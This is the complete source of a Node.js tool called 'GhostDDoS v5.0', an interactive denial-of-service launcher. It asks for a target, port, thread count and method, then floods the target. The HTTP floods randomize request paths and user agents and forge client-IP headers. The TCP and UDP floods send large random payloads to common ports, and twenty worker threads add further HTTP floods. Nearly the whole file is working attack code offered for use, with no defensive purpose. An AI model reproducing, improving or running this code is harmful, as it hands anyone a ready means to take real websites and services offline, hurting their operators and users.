// ╔══════════════════════════════════════════════════════════════╗
// ║     ☠️  GhostDDoS ENGINE v5.0  ☠️                           ║
// ║     NODE.JS INTERACTIVE DDOS SYSTEM                          ║
// ║     BY: NULL7 - GHOSTDDOS                                    ║
// ╚══════════════════════════════════════════════════════════════╝

const net = require('net');
const http = require('http');
const https = require('https');
const dgram = require('dgram');
const { Worker, isMainThread, parentPort, workerData, threadId } = require('worker_threads');
const crypto = require('crypto');
const readline = require('readline');
const os = require('os');

process.stdout.write('\x1b[2J\x1b[H');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const C = {
    R: '\x1b[91m',
    G: '\x1b[92m',
    Y: '\x1b[93m',
    B: '\x1b[94m',
    M: '\x1b[95m',
    C: '\x1b[96m',
    W: '\x1b[97m',
    D: '\x1b[90m',
    X: '\x1b[0m',
};

// Fixed width: 62 chars for box content area
const BW = 62;

function boxLine(text, color = C.W) {
    const stripped = text.replace(/\x1b\[[0-9;]*m/g, '');
    const pad = BW - stripped.length;
    return `${C.R}│${C.X}  ${color}${text}${' '.repeat(pad)}${C.R}│${C.X}`;
}

const BANNER = `
${C.R}
                      .                                                      .
                            .n                   .                 .                  n.
                      .   .dP                  dP                   9b                 9b.    .
                     4    qXb         .       dX                     Xb       .        dXp     t
                    dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
                    9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
                     9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
                      \`9XXXXXXXXXXXXXXXXXXXXX'~   ~\`OOO8b   d8OOO'~   ~\`XXXXXXXXXXXXXXXXXXXXXP'
                        \`9XXXXXXXXXXXP' \`9XX'   DIE    \`98v8P'  HUMAN   \`XXP' \`9XXXXXXXXXXXP'
                            ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                                            )b.  .dbo.dP'\`v\`'9b.odb.  .dX(
                                          ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                                         dXXXXXXXXXXXP'   .   \`9XXXXXXXXXXXb
                                        dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                                        9XXb'   \`XXXXXb.dX|Xb.dXXXXX'   \`dXXP
                                         \`'      9XXXXXX(   )XXXXXXP      \`'
                                                  XXXX X.\`v'.X XXXX
                                                  XP^X'\`b   d'\`X^XX
                                                  X. 9  \`   '  P )X
                                                  \`b  \`       '  d'
                                                   \`             '
${C.X}`;

const HEADER = `
${C.R}┌──────────────────────────────────────────────────────────────┐${C.X}
${boxLine('☠️  GhostDDoS v5.0  -  THE ULTIMATE FLOOD PROTOCOL')}
${boxLine('BY: NULL7 - GHOSTDDOS', C.D)}
${C.R}└──────────────────────────────────────────────────────────────┘${C.X}`;

const CONFIG_BOX = `
${C.R}┌──────────────────────────────────────────────────────────────┐${C.X}
${boxLine('☠️  CONFIGURATION MENU')}
${boxLine('Enter target details to begin the attack', C.D)}
${C.R}└──────────────────────────────────────────────────────────────┘${C.X}`;

const LINE = `${C.R}──────────────────────────────────────────────────────────────${C.X}`;

class GhostDDoS {
    constructor(target, threads, port, method) {
        this.target = target;
        this.threads = threads || 24;
        this.port = port || 80;
        this.method = method || 'HYBRID';
        this.packetCount = 0;
        this.bytesSent = 0;
        this.connectionCount = 0;
        this.isRunning = true;
        this.userAgents = [];
        this.referers = [];
        this.attackVectors = ['GET', 'POST', 'HEAD', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'];
        this.initPayloads();
    }

    initPayloads() {
        for (let i = 0; i < 5000; i++) {
            this.userAgents.push(
                `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/${537 + Math.floor(Math.random() * 100)}.${Math.floor(Math.random() * 36)} (KHTML, like Gecko) Chrome/${120 + Math.floor(Math.random() * 10)}.0.${Math.floor(Math.random() * 9999)}.${Math.floor(Math.random() * 999)} Safari/537.${Math.floor(Math.random() * 36)}`
            );
            this.referers.push(
                `https://www.google${Math.floor(Math.random() * 10)}.com/search?q=${crypto.randomBytes(Math.floor(Math.random() * 20) + 5).toString('hex')}`
            );
        }
    }

    getRandomIP() {
        const octets = [];
        octets.push(Math.floor(Math.random() * 223) + 1);
        for (let i = 0; i < 3; i++) {
            octets.push(Math.floor(Math.random() * 255));
        }
        return octets.join('.');
    }

    generateMassivePayload() {
        const size = Math.floor(Math.random() * 65000) + 1500;
        return crypto.randomBytes(size);
    }

    generateRandomPath() {
        const paths = [
            '/login', '/admin', '/api', '/search', '/index', '/home',
            '/wp-admin', '/config', '/.env', '/backup', '/data',
            '/upload', '/download', '/user', '/profile', '/dashboard'
        ];
        const base = paths[Math.floor(Math.random() * paths.length)];
        return `${base}?${crypto.randomBytes(Math.floor(Math.random() * 50) + 10).toString('hex')}=${crypto.randomBytes(Math.floor(Math.random() * 100) + 20).toString('hex')}`;
    }

    httpFlood() {
        const agent = new http.Agent({
            keepAlive: true,
            maxSockets: Infinity,
            maxFreeSockets: Infinity,
            timeout: 0,
            scheduling: 'fifo'
        });

        const sendRequest = () => {
            if (!this.isRunning) return;

            const method = this.attackVectors[Math.floor(Math.random() * this.attackVectors.length)];
            const path = this.generateRandomPath();
            const ua = this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
            const ref = this.referers[Math.floor(Math.random() * this.referers.length)];
            const payload = method === 'POST' || method === 'PUT' ? this.generateMassivePayload() : null;

            const options = {
                hostname: this.target.replace(/https?:\/\//, '').split('/')[0],
                port: this.port,
                path: path,
                method: method,
                agent: agent,
                headers: {
                    'User-Agent': ua,
                    'Referer': ref,
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ru;q=0.6',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                    'Pragma': 'no-cache',
                    'X-Forwarded-For': this.getRandomIP(),
                    'X-Real-IP': this.getRandomIP(),
                    'X-Client-IP': this.getRandomIP(),
                    'CF-Connecting-IP': this.getRandomIP(),
                    'True-Client-IP': this.getRandomIP(),
                    'Connection': 'keep-alive',
                    'Keep-Alive': 'timeout=99999, max=1000',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    ...(payload && { 'Content-Length': String(payload.length) })
                }
            };

            const req = http.request(options);
            
            req.on('error', () => {});
            req.on('socket', (socket) => {
                socket.setNoDelay(true);
                socket.setTimeout(0);
                socket.setKeepAlive(true, 99999);
            });

            if (payload) {
                req.write(payload);
            }

            req.end();
            this.packetCount++;
            this.connectionCount++;
            this.bytesSent += payload ? payload.length : 1024;

            setImmediate(() => sendRequest());
        };

        for (let i = 0; i < 500; i++) {
            sendRequest();
        }
    }

    tcpSynFlood() {
        const sendSyn = () => {
            if (!this.isRunning) return;

            const client = new net.Socket();
            client.setNoDelay(true);
            client.setTimeout(0);
            client.setKeepAlive(true, 99999);

            client.connect(this.port, this.target.replace(/https?:\/\//, '').split('/')[0], () => {
                const massiveData = this.generateMassivePayload();
                const writeMore = () => {
                    if (!this.isRunning || client.destroyed) return;
                    client.write(massiveData, () => {
                        this.packetCount++;
                        this.bytesSent += massiveData.length;
                        setImmediate(() => writeMore());
                    });
                };
                writeMore();
            });

            client.on('error', () => {});
            client.on('close', () => {
                if (this.isRunning) {
                    setImmediate(() => sendSyn());
                }
            });
        };

        for (let i = 0; i < 3000; i++) {
            sendSyn();
        }
    }

    udpFlood() {
        const socket = dgram.createSocket('udp4');
        const targetPorts = [80, 443, 8080, 8443, 53, 123, 161, 1900, 11211];

        const sendUDP = () => {
            if (!this.isRunning) return;

            const port = targetPorts[Math.floor(Math.random() * targetPorts.length)];
            const payload = this.generateMassivePayload();

            socket.send(payload, 0, payload.length, port, this.target.replace(/https?:\/\//, '').split('/')[0], (err) => {
                if (!err) {
                    this.packetCount++;
                    this.bytesSent += payload.length;
                }
                setImmediate(() => sendUDP());
            });
        };

        for (let i = 0; i < 100; i++) {
            sendUDP();
        }
    }

    attackUI() {
        process.stdout.write('\x1b[2J\x1b[H');
        console.log(BANNER);
        console.log(HEADER);
        console.log('');
        console.log(`${C.R}  [${C.Y}☠️${C.R}] ${C.W}STATUS   ${C.R}: ${C.G}● ATTACK IN PROGRESS${C.X}`);
        console.log(`${C.R}  [${C.Y}☠️${C.R}] ${C.W}TARGET   ${C.R}: ${C.Y}https://${this.target}${C.X}`);
        console.log(`${C.R}  [${C.Y}☠️${C.R}] ${C.W}PORT     ${C.R}: ${C.Y}${this.port}${C.X}`);
        console.log(`${C.R}  [${C.Y}☠️${C.R}] ${C.W}METHOD   ${C.R}: ${C.M}${this.method}${C.X}`);
        console.log(`${C.R}  [${C.Y}☠️${C.R}] ${C.W}THREADS  ${C.R}: ${C.C}${this.threads}${C.X}`);
        console.log(`${C.R}  [${C.Y}☠️${C.R}] ${C.W}PACKETS  ${C.R}: ${C.G}${this.packetCount.toLocaleString()}${C.X}`);
        console.log(`${C.R}  [${C.Y}☠️${C.R}] ${C.W}DATA     ${C.R}: ${C.G}${(this.bytesSent / 1024 / 1024).toFixed(2)} MB${C.X}`);
        console.log(`${C.R}  [${C.Y}☠️${C.R}] ${C.W}STOP     ${C.R}: ${C.D}CTRL + C${C.X}`);
        console.log('');
        console.log(`${C.R}  ${C.D}${LINE}${C.X}`);
        console.log(`${C.R}  ${C.W}ATTACK LOG${C.X}`);
        console.log(`${C.R}  ${C.D}${LINE}${C.X}`);
        console.log('');

        setInterval(() => {
            for (let i = 0; i < 3; i++) {
                console.log(`${C.R}  [${C.Y}►${C.R}] GhostDDoS attack target ${C.W}https://${this.target}${C.X}`);
            }
        }, 50);
    }

    launch() {
        process.stdout.write('\x1b[2J\x1b[H');
        console.log(BANNER);
        console.log(HEADER);
        console.log('');
        console.log(`${C.R}  [${C.Y}*${C.R}] ${C.W}INITIALIZING GhostDDoS ENGINE...${C.X}`);
        console.log(`${C.R}  [${C.Y}*${C.R}] ${C.W}TARGET  ${C.R}: ${C.Y}https://${this.target}${C.X}`);
        console.log(`${C.R}  [${C.Y}*${C.R}] ${C.W}THREADS ${C.R}: ${C.C}${this.threads}${C.X}`);
        console.log(`${C.R}  [${C.Y}*${C.R}] ${C.W}METHOD  ${C.R}: ${C.M}${this.method}${C.X}`);
        console.log('');
        console.log(`${C.R}  [${C.Y}*${C.R}] ${C.W}LAUNCHING ATTACK...${C.X}`);
        
        setTimeout(() => {
            this.attackUI();
            
            this.httpFlood();
            this.tcpSynFlood();
            this.udpFlood();
            
            for (let i = 0; i < 20; i++) {
                new Worker(__filename, {
                    workerData: { target: this.target, id: i, port: this.port }
                });
            }
        }, 2000);
    }

    stop() {
        this.isRunning = false;
    }
}

if (!isMainThread) {
    const { target, port } = workerData;
    const agent = new http.Agent({
        keepAlive: true,
        maxSockets: Infinity,
        maxFreeSockets: Infinity,
        timeout: 0
    });
    
    const attackLoop = () => {
        const paths = ['/', '/admin', '/login', '/api', '/wp-admin', '/.env', '/config', '/search'];
        const methods = ['GET', 'POST', 'HEAD', 'OPTIONS'];
        const path = paths[Math.floor(Math.random() * paths.length)] + '?' + crypto.randomBytes(32).toString('hex');
        const method = methods[Math.floor(Math.random() * methods.length)];
        const payload = crypto.randomBytes(Math.floor(Math.random() * 65000) + 1500);
        
        const options = {
            hostname: target.replace(/https?:\/\//, '').split('/')[0],
            port: port,
            path: path,
            method: method,
            agent: agent,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/' + (537 + Math.random() * 100) + '.36',
                'Content-Type': 'application/octet-stream',
                'Content-Length': String(payload.length),
                'X-Forwarded-For': Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255)
            }
        };
        
        const req = http.request(options);
        req.write(payload);
        req.end();
        req.on('error', () => {});
        
        setImmediate(() => attackLoop());
    };
    
    for (let i = 0; i < 100; i++) {
        attackLoop();
    }
}

if (isMainThread) {
    console.log('\x1b[2J\x1b[H');
    console.log(BANNER);
    console.log(HEADER);
    console.log('');
    console.log(CONFIG_BOX);
    console.log('');
    
    const askQuestion = (query) => {
        return new Promise((resolve) => {
            rl.question(`${C.R}  [${C.Y}?${C.R}] ${C.W}${query}${C.X} `, (answer) => {
                resolve(answer);
            });
        });
    };

    const startAttack = async () => {
        let target = await askQuestion('TARGET URL/IP (e.g., web.com)  :');
        target = target.replace(/https?:\/\//, '').split('/')[0];
        
        let port = await askQuestion('TARGET PORT (default 80)       :');
        port = parseInt(port) || 80;
        
        let threads = await askQuestion('NUMBER OF THREADS (default 24) :');
        threads = parseInt(threads) || 24;
        
        let method = await askQuestion('ATTACK METHOD (HYBRID/HTTP/TCP/UDP) :');
        method = method.toUpperCase() || 'HYBRID';
        
        console.log('');
        console.log(`${C.R}┌──────────────────────────────────────────────────────────────┐${C.X}`);
        console.log(boxLine('☠️  CONFIGURATION SUMMARY'));
        console.log(`${C.R}├──────────────────────────────────────────────────────────────┤${C.X}`);
        console.log(boxLine(`TARGET   : https://${target}`, C.Y));
        console.log(boxLine(`PORT     : ${port}`, C.Y));
        console.log(boxLine(`THREADS  : ${threads}`, C.Y));
        console.log(boxLine(`METHOD   : ${method}`, C.Y));
        console.log(`${C.R}└──────────────────────────────────────────────────────────────┘${C.X}`);
        console.log('');
        console.log(`${C.R}  [${C.Y}*${C.R}] ${C.W}LAUNCHING GhostDDoS IN 3 SECONDS...${C.X}`);
        
        setTimeout(() => {
            const engine = new GhostDDoS(target, threads, port, method);
            engine.launch();
            
            process.on('SIGINT', () => {
                engine.stop();
                console.log('');
                console.log(`${C.R}  [${C.Y}☠️${C.R}] ${C.W}GhostDDoS ATTACK TERMINATED${C.X}`);
                console.log('');
                rl.close();
                process.exit(0);
            });
        }, 3000);
    };

    startAttack();
}